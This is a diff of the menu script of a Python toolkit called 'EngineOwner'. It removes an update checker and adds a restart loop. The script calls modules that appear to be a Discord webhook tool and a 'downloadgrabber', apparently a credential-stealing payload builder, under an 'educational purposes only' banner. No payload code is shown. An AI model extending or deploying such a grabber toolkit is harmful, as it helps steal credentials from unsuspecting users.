@@ -1,4 +1,6 @@
 import requests
+import os
+import time
 from os import system
 from colorama import Fore
 from tools.webhook import dwebhook
@@ -11,24 +13,6 @@ from tools.flashbang import fucker
 
 title = "EngineOwner ║ github.com/itssnee/engine-owner"
 system("title " + title)
-version = 1.00
-
-def updater():
-    """Checks for updates"""
-    print(f"   {Fore.RED}[>] Checking for updates")
-    
-    try:
-        latest_version = get("https://raw.githubusercontent.com/itssnee/engine-owner/master/version").text.rstrip()
-    except:
-        print(f"   {Fore.RED}[>] Could not connect to server")
-        sleep(2)
-        return
-    
-    if latest_version != version:
-        print(f"   {Fore.RED}[>] Your version is outdated!")
-        print(f"   {Fore.RED}[>] Update here: https://github.com/itssnee/engine-owner/releases/tag/v{latest_version}")
-        input(f"   {Fore.RED}[>] Press enter to ignore")
-        return
 
 banner = Fore.RED + """
 ___________              .__                ________                             
@@ -52,7 +36,6 @@ ___________              .__                ________
                      ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                      we recommend Option 13 and 11
                      educational purposes only
-                     enter [0] to check for updates
 """
 option = Fore.RED + "     [>] "
 
@@ -103,7 +86,8 @@ def owner():
         downloadgrabber(webhook=webhook)
     elif lmao == "18":
         print("                     available tools:")
-        print("""                   2 done
+        print("""
+                                    2 done
                                     3 done
                                     5 done
                                     6 done
@@ -115,7 +99,9 @@ def owner():
                                     16 done
                                     17 done 
                                     """)
-    elif lmao == "0":
+        input("press enter to restart the program.")
+        os.system ('cls')
+        owner()
     else:
         input("Invalid Input! Please take a look at wich tools are currently working(option 18)")
         owner()
